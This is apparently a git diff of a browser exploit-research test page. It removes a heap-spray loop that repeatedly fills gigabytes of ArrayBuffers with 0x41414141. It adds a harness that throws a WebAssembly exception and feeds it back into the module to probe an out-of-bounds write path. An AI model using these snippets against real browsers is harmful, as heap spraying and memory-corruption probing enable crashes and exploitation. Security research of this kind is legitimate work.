@@ -1,68 +1,33 @@
 <!DOCTYPE html>
 <html>
-<head><title>Memory Obliterator 3000</title></head>
+<head><title>Wasm OOB Tester</title></head>
 <body>
-  <h1>cromos bingbang: Touching memory it shouldn’t 😎</h1>
-
-  <div>
-    <label><input type="radio" name="target" value="4" checked> 4 GB</label>
-    <label><input type="radio" name="target" value="8"> 8 GB</label>
-    <label><input type="radio" name="target" value="16"> 16 GB</label>
-  </div>
-
-  <p id="status">Allocated: 0 MB</p>
+  <h1>Wasm OOB Write Path Explorer</h1>
+  <pre id="output"></pre>
 
   <script>
-    const buffers = [];
-    const SIZE = 0x40000; // 256 KB per buffer approx
-    const NUM = 0x2000;   // buffers per cycle (adjust if needed)
+    const log = (msg) => {
+      document.getElementById("output").textContent += msg + "\n";
+    };
 
-    function getSelectedTargetGB() {
-      const radios = document.querySelectorAll('input[name="target"]');
-      for (const r of radios) {
-        if (r.checked) return parseInt(r.value);
-      }
-      return 4; // fallback
-    }
+    (async () => {
+      const buf = await fetch("exception.wasm").then(r => r.arrayBuffer());
+      const mod = await WebAssembly.compile(buf);
+      const instance = await WebAssembly.instantiate(mod);
 
-    function sprayMemory(targetBytes) {
-      let allocatedBytes = 0;
+      try {
+        instance.exports.crash();
+      } catch (e) {
+        log("Caught exception: " + e);
 
-      for (let i = 0; i < NUM; i++) {
-        if (allocatedBytes >= targetBytes) break;
-
-        const ab = new ArrayBuffer(SIZE);
-        const view = new DataView(ab);
-        for (let j = 0; j < SIZE; j += 4) {
-          view.setUint32(j, 0x41414141, true);
+        try {
+          instance.exports.receive(e);
+          log("Back in Wasm — UnpackException ran!");
+        } catch (inner) {
+          log("Receive failed: " + inner);
         }
-        buffers.push(ab);
-        allocatedBytes += SIZE;
       }
-      return allocatedBytes;
-    }
-
-    function clearBuffers() {
-      buffers.length = 0;
-      if (typeof gc === 'function') gc(); // manual GC trigger if exposed
-    }
-
-    function loop() {
-      const targetGB = getSelectedTargetGB();
-      const targetBytes = targetGB * 1024 * 1024 * 1024;
-
-      const allocatedBytes = sprayMemory(targetBytes);
-      document.getElementById('status').textContent = `Allocated: ${(allocatedBytes / (1024*1024)).toFixed(2)} MB`;
-
-      // After spraying target memory, reset buffers and do it again
-      setTimeout(() => {
-        clearBuffers();
-        document.getElementById('status').textContent += ' — Resetting buffers and looping...';
-        setTimeout(loop, 100); // small delay before next spray
-      }, 1000); // wait 1s before reset to give memory time to settle
-    }
-
-    loop();
+    })();
   </script>
 </body>
 </html>
